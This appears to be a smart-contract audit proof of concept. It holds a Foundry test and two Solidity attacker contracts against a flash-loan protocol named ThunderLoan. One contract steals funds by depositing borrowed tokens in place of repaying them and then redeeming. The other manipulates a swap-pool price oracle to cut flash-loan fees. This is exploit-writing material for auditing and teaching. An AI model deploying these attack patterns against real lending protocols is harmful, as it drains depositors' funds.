## TestCode

#/test/unit/ThunderLoanTest
```js
function testUseDepositExceptOfRepayToStealFunds()

public

setAllowedToken

hasDeposits

{

vm.startPrank(user);

uint256 amountToBorrow = 50e18;

uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));

tokenA.mint(address(dor), fee);

// tokenA.approve(address(dor), fee);

thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");

dor.reedemMoney();

vm.stopPrank();

  

assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);

}

}
```
---

Attack contract

```js

contract DepositOverRepay is IFlashLoanReceiver {

ThunderLoan thunderLoan;

AssetToken assetToken;

IERC20 s_token;

  

constructor(address _thunderLoan) {

thunderLoan = ThunderLoan(_thunderLoan);

}

  

function executeOperation(

address token,

uint256 amount,

uint256 fee,

address /*initiator*/,

bytes calldata /*params*/

) external returns (bool) {

s_token = IERC20(token);

assetToken = thunderLoan.getAssetFromToken(IERC20(token));

IERC20(token).approve(address(thunderLoan), amount + fee);

thunderLoan.deposit(IERC20(token), amount + fee);

  

return true;

}

  

function reedemMoney() public {

uint256 amount = assetToken.balanceOf(address(this));

thunderLoan.redeem(s_token, amount);

}

}

  

contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {

ThunderLoan thunderLoan;

address repayAddress;

BuffMockTSwap tSwapPool;

bool attacked;

uint256 public feeOne;

uint256 public feeTwo;

  

constructor(

address _tSwapP0ol,

address _thunderLoan,

address _repayAddress

) {

tSwapPool = BuffMockTSwap(_tSwapP0ol);

thunderLoan = ThunderLoan(_thunderLoan);

repayAddress = _repayAddress;

}

  

function executeOperation(

address token,

uint256 amount,

uint256 fee,

address /*initiator*/,

bytes calldata /*params*/

) external returns (bool) {

if (!attacked) {

// 1. Swap TokenA borrowed for WETH

// 2. Take another flash loan, show the difference

feeOne = fee;

attacked = true;

uint256 wethBought = tSwapPool.getOutputAmountBasedOnInput(

50e18,

100e18,

100e18

);

IERC20(token).approve(address(tSwapPool), 50e18);

// Tank the price

tSwapPool.swapPoolTokenForWethBasedOnInputPoolToken(

50e18,

wethBought,

block.timestamp

);

thunderLoan.flashloan(address(this), IERC20(token), amount, "");

// IERC20(token).approve(address(thunderLoan), amount + fee);

// thunderLoan.repay(IERC20(token), amount + fee);

IERC20(token).transfer(address(repayAddress), amount + fee);

} else {

feeTwo = fee;

// IERC20(token).approve(address(thunderLoan), amount + fee);

// thunderLoan.repay(IERC20(token), amount + fee);

IERC20(token).transfer(address(repayAddress), amount + fee);

}

  

return true;

}

}
```